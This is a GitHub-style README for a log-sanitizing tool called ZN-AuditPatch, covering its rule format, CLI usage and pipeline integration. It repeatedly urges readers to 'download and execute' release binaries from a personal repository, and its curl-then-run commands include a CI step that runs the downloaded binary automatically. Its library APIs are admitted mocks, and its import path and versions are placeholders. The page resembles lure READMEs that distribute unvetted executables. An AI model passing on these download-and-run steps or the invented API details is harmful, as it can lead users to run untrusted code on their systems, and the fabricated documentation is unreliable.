Audit Log Sanitizer: Mask and Remove Sensitive Context in Logs
[https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases](https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases)

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases)

![Audit Logs](https://raw.githubusercontent.com/github/explore/main/topics/logging/logging.png)

Project purpose
- Provide a compact, high-performance tool to find and replace sensitive context inside audit logs.
- Remove secrets, mask personal data, and rewrite sensitive fields before logs leave a host or a pipeline.
- Offer a small CLI and library hook to integrate with log forwarders, SIEMs, and CI/CD pipelines.

Quick summary
- Fast pattern matching on structured and free-form logs.
- Replace, mask, or redact fields with configurable rules.
- Works as a drop-in filter for file logs, stdin, and streaming sources.
- Supports JSON, key=value, and plain text formats.

Why use this
- Prevent secrets from leaking into long-term storage.
- Keep audit logs useful while reducing exposure of personal or internal context.
- Add a simple pre-send step for SIEM pipelines.
- Maintain an audit trail while removing sensitive fragments.

Main features
- Rule engine: JSON or YAML rules to match keys, values, or patterns.
- Multiple actions: redact, mask, replace, hash.
- Context-aware parsing: preserves structure for JSON and key=value logs.
- High throughput: uses streaming parser and buffered IO.
- Small footprint: single binary and minimal dependencies.
- Test mode: run rules against samples before applying them.

How it works
- The tool reads log input from a source (file, stdin, stream).
- It tokenizes lines and attempts structured parse for JSON and key=value.
- It applies rule matches in order. Rules support regex, glob, and exact match.
- An action rewrites the matched portion into a safe value (masked text, hashed digest, or fixed string).
- The tool writes the sanitized output to the destination stream or file.

Screenshots and demo images
- Output example (sanitized JSON):
  {
    "user":"[REDACTED]",
    "email":"***@***.com",
    "ip":"127.0.0.1",
    "action":"login"
  }

- Log pipeline diagram:
  ![Pipeline](https://images.unsplash.com/photo-1559028012-4816b6e7a5d9?auto=format&fit=crop&w=1200&q=60)

Installation and releases
- Download and execute the latest release from: https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases
- The release page hosts packaged binaries for common platforms. Download the appropriate archive and run the included installer or binary.
- Common install flow (example):
  1. Visit the release page above.
  2. Download the file for your OS (zip, tar.gz, or binary).
  3. Extract and run the installer or binary. Typical command:
     - Linux/macOS:
       curl -L -o zn-auditpatch.tar.gz "https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases/download/vX.Y.Z/zn-auditpatch-linux-amd64.tar.gz"
       tar -xzf zn-auditpatch.tar.gz
       ./zn-auditpatch --help
     - Windows:
       Download the .zip from the release page, extract, and run zn-auditpatch.exe

If the provided release link becomes unavailable, check the Releases section on the repository page.

Badges
[![License](https://img.shields.io/badge/license-MIT-green?style=flat)](LICENSE)
[![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat)](#)
[![Docs](https://img.shields.io/badge/docs-usage-blue?style=flat)](#)

CLI usage examples
- Basic stream sanitize (stdin -> stdout):
  cat raw.log | ./zn-auditpatch sanitize --rules rules.yaml > sanitized.log

- File in-place rewrite:
  ./zn-auditpatch sanitize --rules rules.yaml --in /var/log/app.log --out /var/log/app.sanitized.log

- Test rules on a sample:
  ./zn-auditpatch test --rules rules.yaml --sample sample.json

Configuration (rules.yaml)
- Use a YAML file to describe rule sets. Each rule contains:
  - id: unique id
  - selector: field path, key name, or regex to match
  - match: regex, glob, or exact
  - action: redact | mask | replace | hash
  - params: extra params for action (mask char, length, salt)
- Example rules:
  - id: redact_emails
    selector: "$.user.email"
    match: ".*"
    action: mask
    params:
      char: "*"
      keep: 2

  - id: remove_tokens
    selector: "token"
    match: ".*"
    action: replace
    params:
      value: "[TOKEN_REMOVED]"

Action details
- redact: replace content with a fixed token "[REDACTED]" or configured token.
- mask: show only a small portion, mask the rest. Example: a@b.com -> **@b.com
- replace: replace the entire matched value with a provided string.
- hash: replace value with a cryptographic hash (sha256) using optional salt to avoid rainbow lookups.

Parsing formats
- JSON: will parse and apply rules on fields and nested paths.
- key=value: will parse common patterns and run rules on keys.
- Plain text: apply regex rules on the line content.

Examples of practical rules
- Remove API keys that match "AKIA[A-Z0-9]{16}":
  - selector: "line"
    match: "AKIA[A-Z0-9]{16}"
    action: replace
    params:
      value: "[AWS_KEY]"

- Mask credit card digits:
  - selector: "line"
    match: "\\b(?:\\d[ -]*?){13,16}\\b"
    action: mask
    params:
      char: "X"
      keep: 4

- Hash email addresses:
  - selector: "email"
    match: ".*@.*"
    action: hash
    params:
      salt: "project-salt"

Integration points
- File watcher: run as a side process to tail logs and emit sanitized copy.
- Log forwarder: integrate as an export plugin for common forwarders like Fluentd/Fluent Bit.
- CI pipeline: sanitize build logs before archive or artifact upload.
- Sidecar: run next to services in containerized environments to sanitize before shipping.

Library mode
- Include as a small library in Go or Python (mock APIs shown below).
- Python example:
  from zn_auditpatch import Sanitize
  engine = Sanitize(rules="rules.yaml")
  out = engine.apply(json_input)
- Go example:
  import "github.com/example/zn-auditpatch"
  engine := zn_auditpatch.New("rules.yaml")
  out := engine.Sanitize([]byte(line))

Performance and safety
- The engine uses streaming parsers to avoid high memory use on large files.
- Rules run in priority order; you control the order in the YAML.
- The tool avoids destructive in-place edits by default; it writes to a new file or stdout unless --force is provided.

Testing
- Use the test mode to verify rule behavior:
  ./zn-auditpatch test --rules rules.yaml --input tests/sample1.log
- The test run returns a JSON report with matches, counts, and rule IDs for quick audit.

Tips and best practices
- Start with a conservative rule set that masks instead of removing, then tighten rules.
- Use hashes for non-reversible identity mapping when you need to correlate events without exposing raw values.
- Keep rule files under source control and version them.
- Run the tool in test mode in a staging environment before deploying to production.

Security
- Store salts and sensitive parameters outside the rules file; inject them via environment variables.
- Rotate salts and update rules periodically where you rely on hashing for irreversible mapping.

CI example (GitHub Actions snippet)
- name: Sanitize logs
  run: |
    curl -L -o zn-auditpatch.tar.gz "https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases/download/vX.Y.Z/zn-auditpatch-linux-amd64.tar.gz"
    tar -xzf zn-auditpatch.tar.gz
    ./zn-auditpatch sanitize --rules rules.yaml --in build.log --out sanitized.log

Contributing
- Open issues for bugs or feature requests.
- Fork, add tests, and submit pull requests to the main branch.
- Keep changes small and add or update rule samples when you add new parsing or action behavior.

License
- This project uses the MIT license. See LICENSE for details.

Frequently asked questions
- How do I redact a field from nested JSON?
  Use a JSON path selector like $.user.credentials.token or the selector syntax supported in rules.yaml.

- Can I preserve partial values?
  Use mask with keep parameter. Example: keep: 4 keeps the last four characters.

- How do I run this on a stream?
  Pipe logs into stdin and read from stdout:
  tail -F /var/log/app.log | ./zn-auditpatch sanitize --rules rules.yaml

Repository resources
- Check releases here: https://github.com/DivyanshuGadpayle003/ZN-AuditPatch/releases
- Explore the /examples folder for sample rules and pipelines.
- Look at /tests for unit and integration tests that show recommended coverage.

Contact and support
- Open an issue if you need a new rule type or integration.
- File reproducible samples for parsing edge cases.

Acknowledgements
- Built for teams that need to keep audit trails while reducing risk.
- Uses streaming parsing and regex libraries for speed and compatibility.

Maintenance note
- Keep release artifacts signed and verify checksums after download.